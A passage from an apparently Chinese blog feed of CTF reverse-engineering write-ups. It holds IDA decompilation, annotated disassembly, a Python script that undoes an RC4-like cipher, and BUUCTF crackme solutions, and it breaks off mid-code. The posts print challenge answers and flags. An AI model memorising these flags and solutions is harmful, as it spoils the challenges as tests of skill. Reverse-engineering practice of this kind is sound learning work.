class="code"><pre><span class="line">__int64 __fastcall sub_400823(__int64 a1, __int64 a2, unsigned __int16 a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed<span class="built_in"> int </span>v3; // ST20_4 a1=v10[256]   a2 =buf[8]          a3=8</span><br><span class="line">  unsigned<span class="built_in"> int </span>v4; // eax</span><br><span class="line">  char v5; // ST19_1</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned __int16 i; // [rsp+16h] [rbp-Eh]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+18h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  v8 = 0;</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">   <span class="built_in"> if </span>( i &gt;= a3 )                              // 循环 8次</span><br><span class="line">      break;                                    // v3=v8+1</span><br><span class="line">    v3 = ((((v8 + 1) &gt;&gt; 31) &gt;&gt; 24) + v8 + 1) - (((v8 + 1) &gt;&gt; 31) &gt;&gt; 24);</span><br><span class="line">    v4 = ((v8 + *(v3 + a1)) &gt;&gt; 31) &gt;&gt; 24;   // v4=0，相当于没有 v4没有存在过</span><br><span class="line">    v8 = (v4 + v8 + *(v3 + a1)) - v4;           // v8=v8+v10[v3]</span><br><span class="line">    v5 = *(v3 + a1);                            // v5=v10[v3]</span><br><span class="line">    *(a1 + v3) = *(v8 + a1);                    // v10[v3]=v10[v8]</span><br><span class="line">    *(a1 + v8) = v5;                            // v10[v8] = v5</span><br><span class="line">    *(i + a2) ^= *((*(v3 + a1) + *(v8 + a1)) + a1);// a2[i]=a2[i]^ (v10[v10[v3]+v10[v8]])</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="脚本编写："><a href="#脚本编写：" class="headerlink" title="脚本编写："></a>脚本编写：</h2><blockquote><p>这道题其实是RC4算法，看到一篇很好的链接讲的很详细：<a href="https://www.52pojie.cn/thread-800115-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-800115-1-1.html</a></p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">key=<span class="string">"ilovectf"</span><span class="comment">#密钥key</span></span><br><span class="line">S=[]<span class="comment">#S盒 S[256]</span></span><br><span class="line">T=[]<span class="comment">#暂时向量T</span></span><br><span class="line">J=0</span><br><span class="line">tmp=<span class="string">""</span></span><br><span class="line">for i in range(256):</span><br><span class="line">S.append(i)<span class="comment">#将0-255的互不重复的元素装入S盒，S[256]</span></span><br><span class="line">T.append(chr(ord(key[i%8])))<span class="comment">#暂时向量T: 将密钥的长度为单位将密钥循环放入其中   这里是v9[256]</span></span><br><span class="line"><span class="comment">#print(v9)</span></span><br><span class="line">for i in range(256):</span><br><span class="line">v3=0</span><br><span class="line">J=(S[i]+ord(T[i])+J)&amp;0xff<span class="comment">#保证是一个字节（0-256范围内）</span></span><br><span class="line">tmp=S[i] </span><br><span class="line">S[i]=S[J]</span><br><span class="line">S[J]=tmp<span class="comment">#交换s[i]和s[j]</span></span><br><span class="line"><span class="comment">#print(S)#根据密钥key打乱S盒，i保证每个元素都得到处理，j保证S盒的打乱是随机的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数一：被打乱的S-box；参数二：是需要加密的数据data；参数3是data的长度</span></span><br><span class="line">j=0</span><br><span class="line">flag=[]</span><br><span class="line">miwen=[0x7E,0x1E,0xD4,0x81,0x42,0xB2,0xA0,0x8F]<span class="comment">#要加密的数据   加密后得到 V3rygo0d 明文</span></span><br><span class="line">for k in range(len(miwen)):</span><br><span class="line">i=(j+1)&amp;0xff <span class="comment">#这题或许  这一点和标准的RC4不同吧，标准的是  （i=i+1）&amp;0xff</span></span><br><span class="line">j=(j+S[i])&amp;0xff</span><br><span class="line">tmp=S[i]</span><br><span class="line">S[i]=S[j]</span><br><span class="line">S[j]=tmp</span><br><span class="line"><span class="comment">#print(S[(S[v3]+S[v80])&amp;0xff])</span></span><br><span class="line">flag.append(S[(S[i]+S[j])&amp;0xff])</span><br><span class="line">print(flag)</span><br><span class="line">flagg=<span class="string">""</span></span><br><span class="line">for i in range(8):</span><br><span class="line">flagg+=chr(flag[i]^miwen[i])</span><br><span class="line">print(flagg)</span><br></pre></td></tr></table></figure><h2 id="脑子啊"><a href="#脑子啊" class="headerlink" title="脑子啊"></a>脑子啊</h2><blockquote><p>这道题起初我看到256就想到RC4了，但不熟悉它，因为平时没太多怎么对elf程序动态调试过，所以刚好拿它熟悉下，ida动态调试，get到了。下面是我调试做的记录，分析过程的记录都在备注上，（动态调试不应该像我这样用，而是应该静态某步或某个函数没太懂，猜测下然后去验证使用，不然花时间会很长，主要花在变量与寄存器的对应关系上），不管，就是要使用动态调试，因为时间结束时间还很很长嘛！</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400745</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400745</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400745</span> loc_400745:                             <span class="comment">; CODE XREF: easy_re:0000000000400806↓j</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400745</span> <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">118h</span>]                 <span class="comment">; eax=i</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040074B <span class="keyword">movsxd</span>  <span class="built_in">rdx</span>, <span class="built_in">eax</span>                        <span class="comment">; rdx=i</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040074E <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>-<span class="number">128h</span>]                 <span class="comment">; 指向al[0]的指针</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400755</span> <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="built_in">rdx</span>                        <span class="comment">; 指向al[i]的指针</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400758</span> <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]             <span class="comment">; al[i]=rbp-128[1]=0xC  ;  al[3]=0x87</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040075B <span class="keyword">movzx</span>   <span class="built_in">edx</span>, <span class="built_in">al</span>                         <span class="comment">; edx=0xC；  将al[3] 0x87暂时放在 edx中</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040075E <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">114h</span>]                 <span class="comment">; eax=0  C 0x95  v8(我觉的)</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400764</span> <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span>                        <span class="comment">; edx=0xC+0=0xC   0xC+0x89=0x95 我觉得v8+al[j]=0x11c</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400766</span> <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">118h</span>]                 <span class="comment">; eax=i</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040076C <span class="keyword">cdqe</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040076E <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rax</span>-<span class="number">110h</span>]    <span class="comment">; 猜是v9[i]指针</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400776</span> <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400779</span> <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span>                        <span class="comment">; edx=v8+al[j]  + v9[j]</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040077B <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">000000000040077D</span> <span class="keyword">sar</span>     <span class="built_in">eax</span>, <span class="number">1Fh</span>                        <span class="comment">; (v8+al[j]  + v9[j])&gt;&gt;31</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400780</span> <span class="keyword">shr</span>     <span class="built_in">eax</span>, <span class="number">18h</span>                        <span class="comment">; 算出  v3  存在 eax</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400783</span> <span class="keyword">add</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span>                        <span class="comment">; edx存的v8+al[j]+v9[j] 0x11C</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400785</span> <span class="keyword">movzx</span>   <span class="built_in">edx</span>, <span class="built_in">dl</span>                         <span class="comment">; edx=byte（v8+al[j]  + v9[j]=0x11C）=0x1c</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400788</span> <span class="keyword">sub</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span>                        <span class="comment">; -v3  算出  v8存在  edx中</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040078A <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span>                        <span class="comment">; v8暂时 放在eax中</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040078C <span class="keyword">mov</span>     [<span class="built_in">rbp</span>-<span class="number">114h</span>], <span class="built_in">eax</span>                 <span class="comment">; 将  v8   0x1C入栈  存在[rbp-114h]</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400792</span> <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">118h</span>]                 <span class="comment">; eax=i</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400798</span> <span class="keyword">movsxd</span>  <span class="built_in">rdx</span>, <span class="built_in">eax</span>                        <span class="comment">; edx=i</span></span><br><span class="line"><span class="symbol">easy_re:</span>000000000040079B <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>-<span class="number">128h</span>]                 <span class="comment">; al[0]</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007A2 <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007A5 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007A8 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>-<span class="number">119h</span>], <span class="built_in">al</span>                  <span class="comment">; v4= al[2]=0x89;al[3]=0x87 暂时放在 [rbp-119]处</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007AE <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">118h</span>]</span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007B4 <span class="keyword">movsxd</span>  <span class="built_in">rdx</span>, <span class="built_in">eax</span>                        <span class="comment">; rdx=i=2</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007B7 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>-<span class="number">128h</span>]                 <span class="comment">; al[0]</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007BE <span class="keyword">add</span>     <span class="built_in">rdx</span>, <span class="built_in">rax</span>                        <span class="comment">; rdx=指向al[i=3]</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007C1 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">114h</span>]                 <span class="comment">; v8  95;eax=v8=0x1C</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007C7 <span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">eax</span>                        <span class="comment">; rcx=0x95;0x1C</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007CA <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>-<span class="number">128h</span>]                 <span class="comment">; rax为  al[]指针</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007D1 <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="built_in">rcx</span>                        <span class="comment">; al[48]得指针处;  指向 al[v8=1C]地址</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007D4 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]             <span class="comment">; eax=0x65；取出al[v8]地址数据  0x77</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007D7 <span class="keyword">mov</span>     [<span class="built_in">rdx</span>], <span class="built_in">al</span>                       <span class="comment">; al[3]=0x77</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007D9 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">114h</span>]                 <span class="comment">; 取出   v8=0x1C</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007DF <span class="keyword">movsxd</span>  <span class="built_in">rdx</span>, <span class="built_in">eax</span>                        <span class="comment">; rdx=v8=0x1C</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007E2 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>-<span class="number">128h</span>]</span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007E9 <span class="keyword">add</span>     <span class="built_in">rdx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007EC <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>-<span class="number">119h</span>]        <span class="comment">; al[v8]=v4=0x87</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007F3 <span class="keyword">mov</span>     [<span class="built_in">rdx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007F5 <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>-<span class="number">118h</span>], <span class="number">1</span>         <span class="comment">; i</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007FC</span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007FC loc_4007FC:                             <span class="comment">; CODE XREF: easy_re:0000000000400740↑j</span></span><br><span class="line"><span class="symbol">easy_re:</span>00000000004007FC <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>-<span class="number">118h</span>], <span class="number">0FFh</span></span><br><span class="line"><span class="symbol">easy_re:</span><span class="number">0000000000400806</span> <span class="keyword">jle</span>     loc_400745                      <span class="comment">; eax=i</span></span><br></pre></td></tr></table></figure><blockquote><p>这个动态调试只是记录下！总之呢，熟悉了RC4算法。</p></blockquote><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>我的方法不是正解，周三晚上组长讲了正规解法，因为精神不佳，我怎么记不清了，哭！！！ 得不偿失的事情，我或许做的太多啦！<br><a href="https://imgchr.com/i/uuZ39J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/27/uuZ39J.png" alt="uuZ39J.png"></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验室每月举行比赛了，害怕又期待！认真学就好了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF re部分题解1</title>
    <link href="http://yoursite.com/2019/09/27/BUUCTF%20re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A31/"/>
    <id>http://yoursite.com/2019/09/27/BUUCTF re部分题解1/</id>
    <published>2019-09-27T15:34:19.000Z</published>
    <updated>2019-09-27T16:29:16.188Z</updated>
    
    <content type="html"><![CDATA[<p>没有妄想，没有失望！</p><a id="more"></a><h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h1><blockquote><p>首先载入ida找到  main()函数：<br>直接看到 flag了，额！DBAPP{49d3c93df25caad81232130f3d2ebfad}<br>提交时：flag{49d3c93df25caad81232130f3d2ebfad}</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// [esp+50h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">5</span>;</span><br><span class="line">  v2 = <span class="string">"DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;"</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"距离出现答案还有%d秒，请耐心等待！\n"</span>, v3);</span><br><span class="line">    sub_40100A();</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"这里本来应该是答案的,但是粗心的程序员忘记把变量写进来了,你要不逆向试试看:(Y/N)\n"</span>);</span><br><span class="line">  v1 = <span class="string">'\x01'</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">'Y'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OD吾爱破解或者IDA这些逆向软件都挺好的！"</span>);</span><br><span class="line">    result = sub_40100A();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="string">'N'</span> )</span><br><span class="line">      <span class="built_in">printf</span>(&amp;byte_425034);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(&amp;byte_42501C);</span><br><span class="line">    result = sub_40100A();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h1><blockquote><p>载入ida：<br>main()</p></blockquote><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">main_0</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进入main_0函数：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+DCh] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> Dest[<span class="number">108</span>]; <span class="comment">// [esp+F4h] [ebp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> Str; <span class="comment">// [esp+160h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [esp+17Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )                   <span class="comment">// Dest[100]的数组  全等于 0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &gt;= <span class="number">0x64</span> )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    Dest[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_41132F(<span class="string">"please enter the flag:"</span>);</span><br><span class="line">  sub_411375(<span class="string">"%20s"</span>, &amp;Str);                     <span class="comment">// 输入字符串</span></span><br><span class="line">  v0 = j_strlen(&amp;Str);                          <span class="comment">// v0=字符串  长度</span></span><br><span class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sub_4110BE((<span class="keyword">int</span>)&amp;Str, v0, (<span class="keyword">int</span>)&amp;v11);<span class="comment">// v1=base64</span></span><br><span class="line">  <span class="built_in">strncpy</span>(Dest, v1, <span class="number">40u</span>);</span><br><span class="line">  v8 = j_strlen(Dest);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">    Dest[j] += j;                               <span class="comment">// Dest[j] =Dest[j]+j</span></span><br><span class="line">  v2 = j_strlen(Dest);                          <span class="comment">// v2= 16</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Dest, Str2, v2) )               <span class="comment">// e3nifIH9b_C@n@dH</span></span><br><span class="line">    sub_41132F(<span class="string">"rigth flag!\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_41132F(<span class="string">"wrong flag!\n"</span>);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们进入sub_4110BE(),猜测是base64</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl sub_411AB0(char *a1, unsigned<span class="built_in"> int </span>a2,<span class="built_in"> int </span>*a3)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in"> int </span>v4; // STE0_4</span><br><span class="line"> <span class="built_in"> int </span>v5; // STE0_4</span><br><span class="line"> <span class="built_in"> int </span>v6; // STE0_4</span><br><span class="line"> <span class="built_in"> int </span>v7; // [esp+D4h] [ebp-38h]</span><br><span class="line">  signed<span class="built_in"> int </span>i; // [esp+E0h] [ebp-2Ch]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v9; // [esp+ECh] [ebp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v10; // [esp+ECh] [ebp-20h]</span><br><span class="line">  signed<span class="built_in"> int </span>v11; // [esp+ECh] [ebp-20h]</span><br><span class="line">  void *Dst; // [esp+F8h] [ebp-14h]</span><br><span class="line">  char *v13; // [esp+104h] [ebp-8h]</span><br><span class="line"></span><br><span class="line"> <span class="built_in"> if </span>( !a1 || !a2 )</span><br><span class="line">   <span class="built_in"> return </span>0;</span><br><span class="line">  v9 = a2 / 3;</span><br><span class="line"> <span class="built_in"> if </span>( (signed int)(a2 / 3) % 3 )</span><br><span class="line">    ++v9;</span><br><span 